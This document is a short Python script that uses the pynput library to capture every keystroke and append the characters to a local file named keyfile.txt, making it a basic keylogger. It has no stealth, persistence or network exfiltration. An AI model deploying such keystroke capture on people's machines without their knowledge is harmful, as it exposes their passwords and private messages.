from pynput import keyboard


def Pressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            chara = key.char
            logKey.write(chara)
        except:
            print("Error getting character")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=Pressed)
    listener.start()
    input()
